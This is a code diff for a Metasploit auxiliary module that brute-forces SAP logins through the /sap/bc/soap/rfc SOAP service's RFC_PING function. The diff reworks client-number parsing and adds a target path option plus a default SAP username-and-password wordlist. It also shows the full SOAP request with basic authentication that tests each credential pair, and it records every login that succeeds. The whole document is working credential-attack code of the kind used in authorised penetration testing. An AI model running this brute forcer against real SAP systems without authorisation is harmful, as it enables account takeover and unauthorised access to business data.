@@ -25,13 +25,10 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize
     super(
-      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_PING Login Brute Forcer',
+      'Name' => 'SAP SOAP Service RFC_PING Login Brute Forcer',
       'Description' => %q{
         This module attempts to brute force SAP username and passwords through the
-        /sap/bc/soap/rfc SOAP service, using RFC_PING function. Default clients can be
-        tested without needing to set a CLIENT. Common/Default user and password
-        combinations can be tested just setting DEFAULT_CRED variable to true. These
-        default combinations are stored in MSF_DATA_DIRECTORY/wordlists/sap_default.txt.
+        /sap/bc/soap/rfc SOAP service, using RFC_PING function.
       },
       'References' =>
         [
@@ -47,34 +44,32 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8000),
-        OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
-        OptBool.new('DEFAULT_CRED',[false, 'Check using the defult password and username',true])
+        OptString.new('CLIENT', [true, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
+        OptString.new('TARGETURI', [true, 'The base path to the SOAP RFC Service', '/sap/bc/soap/rfc']),
+        OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
+          File.join(Msf::Config.data_directory, "wordlists", "sap_default.txt") ])
       ], self.class)
   end
 
-  def run_host(ip)
-    if datastore['CLIENT'].nil?
-      print_status("Using default SAP client list")
-      client = ['000', '001', '066']
+  def run_host(rhost)
+    client_list = []
+    if datastore['CLIENT'] =~ /^\d{3},/
+      client_list = datastore['CLIENT'].split(/,/)
+      print_status("Brute forcing clients #{datastore['CLIENT']}")
+    elsif datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
+      array = datastore['CLIENT'].split(/-/)
+      client_list = (array.at(0)..array.at(1)).to_a
+      print_status("Brute forcing clients #{datastore['CLIENT']}")
+    elsif datastore['CLIENT'] =~ /^\d{3}\z/
+      client_list.push(datastore['CLIENT'])
+      print_status("Brute forcing client #{datastore['CLIENT']}")
     else
-      client = []
-      if datastore['CLIENT'] =~ /^\d{3},/
-        client = datastore['CLIENT'].split(/,/)
-        print_status("Brute forcing clients #{datastore['CLIENT']}")
-      elsif datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
-        array = datastore['CLIENT'].split(/-/)
-        client = (array.at(0)..array.at(1)).to_a
-        print_status("Brute forcing clients #{datastore['CLIENT']}")
-      elsif datastore['CLIENT'] =~ /^\d{3}\z/
-        client.push(datastore['CLIENT'])
-        print_status("Brute forcing client #{datastore['CLIENT']}")
-      else
-        print_status("Invalid CLIENT - using default SAP client list instead")
-        client = ['000', '001', '066']
-      end
+      fail_with(Failure::BadConfig, "Invalid CLIENT")
     end
-    saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,
-      'Header' => "[SAP] Credentials",
+
+    saptbl = Msf::Ui::Console::Table.new(
+      Msf::Ui::Console::Table::Style::Default,
+      'Header' => "[SAP] #{peer} Credentials",
       'Prefix' => "\n",
       'Postfix' => "\n",
       'Indent'  => 1,
@@ -86,29 +81,29 @@ class Metasploit4 < Msf::Auxiliary
           "user",
           "pass"
         ])
-    if datastore['DEFAULT_CRED']
-      credentials = extract_word_pair(Msf::Config.data_directory + '/wordlists/sap_default.txt')
-      credentials.each do |u, p|
-        client.each do |cli|
-          success = bruteforce(u, p, cli)
-          if success
-            saptbl << [ rhost, rport, cli, u, p]
-          end
+
+    client_list.each do |c|
+      print_status("#{peer} [SAP] Trying client: #{c}")
+      each_user_pass do |u, p|
+        vprint_status("#{peer} [SAP] Trying #{c}:#{u}:#{p}")
+        begin
+          success = bruteforce(u, p, c)
+          saptbl << [ rhost, rport, c, u, p] if success
+        rescue ::Rex::ConnectionError
+          print_error("#{peer} [SAP] Not responding")
+          return
         end
       end
     end
-    each_user_pass do |u, p|
-      client.each do |cli|
-        success = bruteforce(u, p, cli)
-        if success
-          saptbl << [ rhost, rport, cli, u, p]
-        end
-      end
+
+    if saptbl.rows.count > 0
+      print_line saptbl.to_s
     end
-    print(saptbl.to_s)
   end
 
   def bruteforce(username,password,client)
+    uri = normalize_uri(target_uri.path)
+
     data = '<?xml version="1.0" encoding="utf-8" ?>'
     data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
     data << '<env:Body>'
@@ -116,39 +111,40 @@ class Metasploit4 < Msf::Auxiliary
     data << '</n1:RFC_PING>'
     data << '</env:Body>'
     data << '</env:Envelope>'
-    begin
-      res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc',
-        'method' => 'POST',
-        'data' => data,
-        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{client}",
-        'ctype' => 'text/xml; charset=UTF-8',
-        'authorization' => basic_auth(username, password),
-        'headers' => {
+
+    res = send_request_cgi({
+      'uri' => uri,
+      'method' => 'POST',
+      'vars_get' => {
+        'sap-client' => client,
+        'sap-language' => 'EN'
+      },
+      'data' => data,
+      'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{client}",
+      'ctype' => 'text/xml; charset=UTF-8',
+      'authorization' => basic_auth(username, password),
+      'headers' =>
+        {
           'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-        },
-        'vars_get' => {
-          'sap-client'    => client,
-          'sap-language'  => 'EN'
         }
-      })
-      if res and res.code == 200
-        report_auth_info(
-          :host => rhost,
-          :port => rport,
-          :sname => "sap",
-          :proto => "tcp",
-          :user => "#{username}",
-          :pass => "#{password}",
-          :proof => "SAP Client: #{client}",
-          :active => true
-        )
-        return true
-      end
-    rescue ::Rex::ConnectionError
-      print_error("[SAP] #{rhost}:#{rport} - Unable to connect")
-      return false
+    })
+
+    if res && res.code == 200 && res.body.include?('RFC_PING')
+      print_good("#{peer} [SAP] Client #{client}, valid credentials #{username}:#{password}")
+      report_auth_info(
+        :host => rhost,
+        :port => rport,
+        :sname => "sap",
+        :proto => "tcp",
+        :user => username,
+        :pass => password,
+        :proof => "SAP Client: #{client}",
+        :active => true
+      )
+      return true
     end
-    return false
+
+    false
   end
 end
+
